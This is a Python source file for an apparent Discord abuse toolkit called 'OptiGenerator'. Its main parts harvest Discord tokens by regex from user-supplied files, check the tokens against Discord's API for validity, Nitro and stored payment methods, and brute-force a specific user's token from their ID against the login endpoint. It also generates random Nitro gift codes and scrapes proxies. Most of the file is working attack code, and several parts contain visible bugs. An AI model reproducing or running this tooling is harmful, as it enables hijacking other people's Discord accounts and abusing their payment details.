# Made by Aran

import requests, os, ctypes, re
from colorama import Fore
from pathlib import Path
import random
import string
import colorama
import base64
import sys
import time
import webbrowser
from colorama import Fore, Back, Style

# Install libraries Function
try:
  import requests
except ImportError:
    os.system('python -m pip install requests')

try:
  import pathlib
except ImportError:
    os.system('python -m pip install pathlib')

try:
  import ctypes
except ImportError:
    os.system('python -m pip install ctypes')

try:
  import colorama
except ImportError:
    os.system('python -m pip install colorama')

nolist = ["no", "n", "nope", "nah", "ne","nay","never"]
yeslist = ["yes", "y", "yer", "yeah","yessir","ye","okay","yep","yea","ok","k","yh","sure"]

os.system("cls")

def checker():
    def cls():
        os.system("cls" if os.name=="nt" else "clear")

    def fexit():
        print()
        input(f"{Fore.RESET}Press Enter button for exit.")
        cls()
        exit()

    if __name__ == "__main__":
        ctypes.windll.kernel32.SetConsoleTitleW("Discord Token Checker by GuFFy_OwO")

    if not os.path.exists("output"):
        os.makedirs("output")

    cls()
    print(f"{Fore.RESET}[{Fore.CYAN}1{Fore.RESET}] Check one file")
    print(f"{Fore.RESET}[{Fore.CYAN}2{Fore.RESET}] Check many files")
    print()
    checkType = input(f"{Fore.CYAN}>{Fore.RESET}Select An Option{Fore.CYAN}:{Fore.RESET} ")
    if "1" in checkType:
        print()
        tokenFileName = input(f"{Fore.CYAN}>{Fore.RESET}Enter the name of the file in wich are the unchecked tokens{Fore.CYAN}:{Fore.RESET} ")
        checkName = os.path.splitext(os.path.basename(tokenFileName))[0]
    elif "2" in checkType:
        print()
        tokenDirectoryName = input(f"{Fore.CYAN}>{Fore.RESET}Enter the directory of the files in wich are the unchecked tokens{Fore.CYAN}:{Fore.RESET} ")
        checkName = os.path.basename(tokenDirectoryName)
        if not os.path.exists(tokenDirectoryName):
            print()
            print(f"{tokenDirectoryName} directory not exist.")
            fexit()
        print()
        print(f"{Fore.RESET}[{Fore.CYAN}1{Fore.RESET}] Check all files")
        print(f"{Fore.RESET}[{Fore.CYAN}2{Fore.RESET}] Enter files formats")
        print()
        ckeckFilesType = input(f"{Fore.CYAN}>{Fore.RESET}Select An Option{Fore.CYAN}:{Fore.RESET} ")
        if "1" in ckeckFilesType:
            None
        elif "2" in ckeckFilesType:
            print()
            fileTypes = ["." + x for x in input(f"{Fore.CYAN}>{Fore.RESET}Enter file types in wich are the unchecked tokens separated by space [txt json html ...]{Fore.CYAN}:{Fore.RESET} ").split()]
        else:
            print()
            print("Invalid Option.")
            fexit()
    else:
        print()
        print("Invalid Option.")
        fexit()

    print()
    checkTokens = input(f"{Fore.CYAN}>{Fore.RESET}Check validity tokens? [Y/N]{Fore.CYAN}:{Fore.RESET} ")
    if "y" in checkTokens.lower():
        print()
        checkNitro = input(f"{Fore.CYAN}>{Fore.RESET}Check nitro and payments on tokens? [Y/N]{Fore.CYAN}:{Fore.RESET} ")
        if "y" or "n" in checkNitro.lower():
            None
        else:
            print()
            print("Invalid Option.")
            fexit()
    elif "n" in checkTokens.lower():
        None
    else:
        print()
        print("Invalid Option.")
        fexit()

    dirValidTokens = f"output/{checkName}_valid.txt"
    dirUnverifiedTokens = f"output/{checkName}_unverified.txt"
    dirSameTokens = f"output/{checkName}_sameTokens.txt"
    dirInvalidTokens =f"output/{checkName}_invalid.txt"
    dirNitroTokens = f"output/{checkName}_nitro.txt"
    dirDataTmp = f"output/{checkName}_data.tmp"
    dirParsedTokens = f"output/{os.path.basename(checkName)}_parsed.txt"

    global checked
    global verified
    global unverified
    global sameTokens
    global invalid
    global nitro
    global idlist

    checked = 0
    verified = 0
    unverified = 0
    sameTokens = 0
    invalid = 0
    nitro = 0
    idlist = []

    def main():
        global found
        if "2" in checkType:
            cls()
            try:
                os.remove(dirDataTmp)
            except: None
            print("Glue files...")
            if "1" in ckeckFilesType:
                files = {p.resolve() for p in Path(tokenDirectoryName).glob("**/*.*")}
            elif "2" in ckeckFilesType:
                files = {p.resolve() for p in Path(tokenDirectoryName).glob("**/*") if p.suffix in fileTypes}
            with open(dirDataTmp, "w", encoding="utf-8") as result:
                for file_ in files:
                    for line in open( file_, "r", encoding="utf-8", errors="ignore"):
                        result.write(line)
            print()
            print("Done!")
            tokenFileName = dirDataTmp
        print()
        print(f"Parse tokens...")
        try:
            os.remove(dirParsedTokens)
        except: None
        tokens = []
        for line in [x.strip() for x in open(f"{tokenFileName}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in re.findall(regex, line):
                    tokens.append(token)
        tokens = list(dict.fromkeys(tokens))
        tokens_str = "\n".join(tokens)
        with open(dirParsedTokens, "a", encoding="utf-8") as f:
            f.write(tokens_str)
        found = len(open(dirParsedTokens).readlines())
        print()
        print(f"Done! Found {Fore.CYAN}{found}{Fore.RESET} tokens!")
        try:
            os.remove(dirDataTmp)
        except: None
        if checkTokens.lower() == "y":
            checker()
        else:
            if os.name=="nt":
                os.system(f'start {os.path.realpath("output")}') 
            fexit()   

    def checker(): 
        cls()
        try:
            os.remove(dirValidTokens)
            os.remove(dirUnverifiedTokens)
            os.remove(dirInvalidTokens)
            os.remove(dirNitroTokens)
            os.remove(dirSameTokens)
        except: None
        try:
            for item in open(dirParsedTokens, "r").readlines():
                CheckToken(item.strip())
            print()
            if checkNitro.lower() == "y":
                print(f"{Fore.CYAN}Checked{Fore.RESET}: {checked}/{found}  |  {Fore.GREEN}Valid{Fore.RESET}: {verified}  |  {Fore.YELLOW}Unverified{Fore.RESET}: {unverified}  |  {Fore.RED}Invalid{Fore.RESET}: {invalid}  |  {Fore.BLUE}Same Tokens{Fore.RESET}: {sameTokens}  |  {Fore.MAGENTA}NITRO{Fore.RESET}: {nitro}")
            else:
                print(f"{Fore.CYAN}Checked{Fore.RESET}: {checked}/{found}  |  {Fore.GREEN}Valid{Fore.RESET}: {verified}  |  {Fore.YELLOW}Unverified{Fore.RESET}: {unverified}  |  {Fore.RED}Invalid{Fore.RESET}: {invalid}  |  {Fore.BLUE}Same Tokens{Fore.RESET}: {sameTokens}")
            if os.name=="nt":
                os.system(f'start {os.path.realpath("output")}')     
            fexit()
        except Exception as e:
            print(e)
            print()
            print("An unexepted error occurred!")
            fexit()

    def get_user_info(token: str):
        json = requests.get("https://discordapp.com/api/v7/users/@me?verified", headers={"authorization": token})           
        if json.status_code == 200:
            json_response = json.json()
            if json_response["id"] not in idlist:
                idlist.append(json_response["id"])
                if json_response["verified"] == True:
                    return True
                else:
                    return False
            else:
                return "sameToken"
        else:
            return None

    def get_plan_id(token: str):
        for json in requests.get("https://discord.com/api/v7/users/@me/billing/subscriptions", headers={"authorization": token}).json():
            try:            
                if json["plan_id"] == "511651880837840896":
                    return True
                else:
                    return False
            except:
                return None

    def get_payment_id(token: str):
        for json in requests.get("https://discordapp.com/api/v7/users/@me/billing/payment-sources", headers={"authorization": token}).json():
            try:
                if json["invalid"] == True:
                    return True
                else:
                    return False
            except:
                return None

    def CheckToken(token):
        global checked
        global verified
        global sameTokens
        global unverified
        global invalid
        global nitro
        if len(token) > 59:
            lenghtToken = f"{token}"
        else:
            lenghtToken = f"{token}                             "
        user_info = get_user_info(token)
        if user_info == "sameToken":
            print(f"{Fore.WHITE}{lenghtToken}   |  {Fore.BLUE}Same User{Fore.RESET}")
            with open(dirSameTokens, "a", encoding="utf-8") as f:
                    f.write(token + "\n")
            sameTokens+= 1
        else:
            if user_info == None:
                with open(dirInvalidTokens, "a", encoding="utf-8") as f:
                    f.write(token + "\n")
                print(f"{Fore.WHITE}{lenghtToken}   |  {Fore.RED}Invalid{Fore.RESET}")
                invalid += 1
            elif user_info == True:
                with open(dirValidTokens, "a", encoding="utf-8") as f:
                    f.write(token + "\n")
                verified += 1
                if checkNitro.lower() == "y":
                    planid = get_plan_id(token)
                    payid = get_payment_id(token)  
                    if planid != None or payid != None:
                        with open(dirNitroTokens, "a", encoding="utf-8") as f:
                            f.write(token + "\n")
                        nitro += 1
                        print(f"{Fore.WHITE}{lenghtToken}   |  {Fore.MAGENTA}Nitro{Fore.RESET}") 
                    else:    
                        print(f"{Fore.WHITE}{lenghtToken}   |  {Fore.GREEN}Valid{Fore.RESET}")
            else: 
                with open(dirUnverifiedTokens, "a", encoding="utf-8") as f:
                        f.write(token + "\n")
                print(f"{Fore.WHITE}{lenghtToken}   |  {Fore.YELLOW}Unverified{Fore.RESET}")
                unverified += 1    
        checked  += 1
        if __name__ == "__main__":
            title()

    def title():
        if checkNitro.lower() == "y":
            ctypes.windll.kernel32.SetConsoleTitleW(f"Discord Token Checker by GuFFy_OwO  |  Checked: {checked}/{found}  |  Valid: {verified}  |  Unverified: {unverified}  |  Invalid: {invalid}  |  Same Tokens: {sameTokens}  |  NITRO: {nitro}")
        else:
            ctypes.windll.kernel32.SetConsoleTitleW(f"Discord Token Checker by GuFFy_OwO  |  Checked: {checked}/{found}  |  Valid: {verified}  |  Unverified: {unverified}  |  Invalid: {invalid}  |  Same Tokens: {sameTokens}")

    main()


def gen(colour = '\033[31m'):
    ctypes.windll.kernel32.SetConsoleTitleW("OptiGenerator")
    os.system("cls")
    colorama.init(convert=True)
    print('''
     ██████╗ ██████╗ ████████╗██╗     ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ 
    ██╔═══██╗██╔══██╗╚══██╔══╝██║    ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
    ██║   ██║██████╔╝   ██║   ██║    ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
    ██║   ██║██╔═══╝    ██║   ██║    ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
    ╚██████╔╝██║        ██║   ██║    ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
     ╚═════╝ ╚═╝        ╚═╝   ╚═╝     ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝                                                                                                   
    ''')
    startmessage = '\033[35m Made by ! Aran#9999 | <3' + '\n'
    startmessage1 = "\033[32m Almost All Tokens And Nitro Won't Work, But You Can Still Try Them"

    for char in startmessage:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.07)

    for char in startmessage1:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.05)
    
    print('\033[39m')
    print('\033[31m')
    print(colour)
    e = 0
    question = print('''
    ╔═══════════════════════╦═════════════════════════╦═══════════════════════════════════════════════╗
    ║                                                                                                 ║ 
    ║    [1] Tokens          [2] Nitro            [3] Token BruteForce           [4] Proxy Scraper    ║   
    ║    [5] Token Checker   [6] Change Colour    [7] OptiToken Discord Server   [8] About            ║ 
    ║                                                                                                 ║ 
    ╚═══════════════════════╩═════════════════════════╩═══════════════════════════════════════════════╝
    ''')
    question = input().lower()

    # Change Colour Function
    if question == '6':
        ctypes.windll.kernel32.SetConsoleTitleW("Colour Changer")
        colourquestion = int(input("Do you want \033[35m Magenta (1), \033[32m Green (2), \033[31m Red (3), or \033[36m Blue (4)?: "))
        print('\033[39m')
        if colourquestion == 1:
            print('\033[35m')
            return gen('\033[35m')
        elif colourquestion == 2:
            print('\033[32m')
            return gen('\033[32m')
        elif colourquestion == 3:
            print('\033[31m')
            return gen('\033[31m')
        elif colourquestion == 4:
            print('\033[36m')
            return gen('\033[36m')
        else:
            print("Invalid Option")
    
    # My Discord Server Auto Join
    elif question == '7':
        ctypes.windll.kernel32.SetConsoleTitleW("OptiToken Server")
        time.sleep(1)
        webbrowser.open('https://discord.gg/QjUUwpnpku')
        print("In this server you can ask for help, purchase our products, tell me any bugs that you encounter etc...")

    # Proxy Scraper
    elif question == '4':
        ctypes.windll.kernel32.SetConsoleTitleW("Proxy Scraper")
        os.system("cls")
        whatproxy = int(input('''
Which type of proxy do you need?
    
[1] Https 
[2] Socks4
[3] Socks5
    \n
'''))
        if whatproxy == 1:
                out_file = "Https Proxies.txt"
                proxies = open(out_file,'wb')
                r1 = requests.get('https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt' and'https://api.openproxylist.xyz/http.txt')
                proxies.write(r1.content)
                length = []
                length.append(r1.content)
                length = length[0].splitlines()
                length1 = len(length)
                print("Completed! Successfully added {} proxies, Check the directory where this program is located".format(length1))
                proxies.close()


        elif whatproxy == 2:
            r1 = requests.get('https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt'and 'https://api.openproxylist.xyz/socks4.txt')
            out_file = "Socks4 Proxies.txt"
            proxies = open(out_file,'wb')
            proxies.write(r1.content)
            length = []
            length.append(r1.content)
            length = length[0].splitlines()
            length1 = len(length)
            print("Completed! Successfully added {} proxies, Check the directory where this program is located".format(length1))
            proxies.close()

        elif whatproxy == 3:
            r1 = requests.get('https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt' and 'https://api.openproxylist.xyz/socks5.txt')
            out_file = "Socks5 Proxies.txt"
            proxies = open(out_file,'wb')
            proxies.write(r1.content)
            length = []
            length.append(r1.content)
            length = length[0].splitlines()
            length1 = len(length)
            print("Completed! Successfully added {} proxies, Check the directory where this program is located".format(length1))
            proxies.close()

        else:
            print("Not a valid choice!")
    elif question == '5':
        checker()

            
    # Token BruteForce
    # Made by Social404
     
    elif question == '3':
        ctypes.windll.kernel32.SetConsoleTitleW("Token bruteforcer | Made by Social404")
        os.system("cls")

        id_to_token = base64.b64encode((input("What is the User's ID?: ")).encode("ascii"))
        id_to_token = str(id_to_token)[2:-1]

        while id_to_token == id_to_token:
            token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=5)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
            headers={
                'Authorization': token
            }
            login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
            try:
                if login.status_code == 200:
                    print('\033[32' + ' [+] VALID' + ' ' + token)
                    f = open('VALID.txt', "a+")
                    f.write(f'{token}\n')
                    break
                else:
                    print('[-] INVALID' + ' ' + token) 
            finally:
                print("")
        input()

        
    # Example https://discord.gift/fna5ykuWb7UnB5K8
    # Random Nitro Generator 0.001% Of getting a real nitro code
    elif question == '2':
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("Nitro Generator")
        unlimited = input("Do you want it to generate forever (It will keep going until you end the program): ").lower()
        quest = input('Do you want to output to a txt?: ')
        if unlimited in nolist and quest in yeslist:
            amount = int(input("How many unchecked gifts do you want?: ")) 
            for x in range(amount):
                a = ''.join((random.choice(string.ascii_letters+string.digits)) for i in range(16))
                gift = "https://discord.gift/" + a + "\n"
                nitrocodes = open("UncheckedNitro.txt","a")
                nitrocodes.write(gift)
            print("Completed! Checked Where This File Is Located")
            nitrocodes.close()

        elif unlimited in nolist and quest in nolist:
            amount = int(input("How many unchecked gifts do you want?: "))
            for x in range(amount):
                a = ''.join((random.choice(string.ascii_letters+string.digits)) for i in range(16))
                gift = "https://discord.gift/" + a 
                print(gift)
            print("Completed!")
            
        elif unlimited in yeslist and quest in yeslist:
            print("It has started, check the directory in which this program is located")
            while True:
                b = ''.join((random.choice(string.ascii_letters+string.digits)) for i in range(16))
                gift1 = "https://discord.gift/" + b + "\n"
                nitrocodes = open("UncheckedNitro.txt","a")
                nitrocodes.write(gift1)

        elif unlimited in yeslist and quest in nolist:
            while True:
                b = ''.join((random.choice(string.ascii_letters+string.digits)) for i in range(16))
                gift1 = "https://discord.gift/" + b
                print(gift1)
        else:
            print("Error")
            exit()

    # Example OTE3NTU5MDczNTE0MzQ4NTU0.Ya6djg.wMvDCaRqB1oDA7ODVb-46u0QEsU
    # Random Token Generator
    elif question == '1':
        ctypes.windll.kernel32.SetConsoleTitleW("Token Generator")
        os.system("cls")

        amount = input("Do you want to generate unlimited tokens (It will not stop till the program is closed)?: ")
        quest = input('Do you want to output to a txt?: ')

        if amount in yeslist:
            if quest in yeslist:
                print("It has started, check the directory in which this program is located")
                while True:
                    a = "".join((random.choice(string.ascii_letters + string.digits)) for x in range(19))
                    b = "".join((random.choice(string.ascii_letters + string.digits)) for x in range(6))
                    c = "".join((random.choice(string.ascii_letters + string.digits)) for x in range(27))
                    token = "Nzy3O" + a + '.' + b + '.' + c + "\n"
                    tokenr = open('tokens.txt',"a")
                    tokenr.write(tokenr)
            elif quest in nolist:
                while True:
                    d = "".join((random.choice(string.ascii_letters + string.digits)) for x in range(19))
                    e = "".join((random.choice(string.ascii_letters + string.digits)) for x in range(6))
                    f = "".join((random.choice(string.ascii_letters + string.digits)) for x in range(27))

                    token1 = "Nzy3O" + d + '.' + e + '.' + f
                    print(token1)
            else:
                print("Error")
                

        if amount in nolist and quest in nolist:
            tkenamount = int(input("How many tokens do you want?: "))
            for r in range(tkenamount):
                g = "".join((random.choice(string.ascii_letters + string.digits)) for x in range(19))
                h = "".join((random.choice(string.ascii_letters + string.digits)) for x in range(6))
                i = "".join((random.choice(string.ascii_letters + string.digits)) for x in range(27))

                token1 = "Nzy3O" + g + '.' + h + '.' + i

                print(token1)
            print("Completed!")

        elif amount in nolist and quest in yeslist:
            tkenamount = int(input("How many tokens do you want?: "))
            for i in range(tkenamount):
                j = "".join((random.choice(string.ascii_letters + string.digits)) for t in range(19))
                k = "".join((random.choice(string.ascii_letters + string.digits)) for t in range(6))
                l = "".join((random.choice(string.ascii_letters + string.digits)) for t in range(27))

                token1 = "Nzy3O" + j + '.' + k + '.' + l + "\n"

                tokene = open('tokens.txt',"a")
                tokene.write(token1) 
            print("Completed Check Where This File Is")
            tokene.close()
        else:
            print("Not Valid Option!")
            exit()
    elif question == '8':
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("Information")
        print('''
          /$$$$$$                                      /$$$$$$                  /$$$$$$$$                 
         /$$__  $$                                    /$$__  $$                |__  $$__/                 
         | $$  \ $$  /$$$$$$  /$$$$$$  /$$$$$$$       | $$  \ $$ /$$$$$$$          | $$  /$$$$$$   /$$$$$$ 
         | $$$$$$$$ /$$__  $$|____  $$| $$__  $$      | $$  | $$| $$__  $$         | $$ /$$__  $$ /$$__  $$
         | $$__  $$| $$  \__/ /$$$$$$$| $$  \ $$      | $$  | $$| $$  \ $$         | $$| $$  \ $$| $$  \ $$
         | $$  | $$| $$      /$$__  $$| $$  | $$      | $$  | $$| $$  | $$         | $$| $$  | $$| $$  | $$
         | $$  | $$| $$     |  $$$$$$$| $$  | $$      |  $$$$$$/| $$  | $$         | $$|  $$$$$$/| $$$$$$$/
         |__/  |__/|__/      \_______/|__/  |__/       \______/ |__/  |__/         |__/ \______/ | $$____/ 
                                                                                                | $$      
                                                                                                | $$      
                                                                                                |__/      
        ''')
        print("This was made by ! Aran#9999, took about 5 hours over 3 days, and was just a fun project ")
        print("OptiTokens = https://discord.gg/tp9ptmpym2")
        print("If you are going to skid atleast put Aran <3 at the top")
    else:
        print("Not Valid Option")
        
    # Restart Function
    restart = input("\nDo you want to start again? ").lower()
    if restart in yeslist:
        gen()
    elif restart in nolist:
        exit()
    else:
        print("error")
        exit()

# License Key function 

keys = ["Aran","Aran1","OptiTokens","Airan","Tokens","Access","LetUserIn","Beginner","Github","Working","Discord","Generator","14","FirstProject","Commit"]

def licenses():                                                                                        
    v = 0
    while v < 1:
        license = str(input("Enter your license key (Case Sensitive): "))
        if license in keys:
            gen()
            v += 1
        elif v == 0:
            askagain1 = input("Do you want to try again?: ").lower()
            if askagain1 in yeslist:
                licenses()
            elif askagain1 in nolist:
                exit()
            else:
                exit()
licenses()


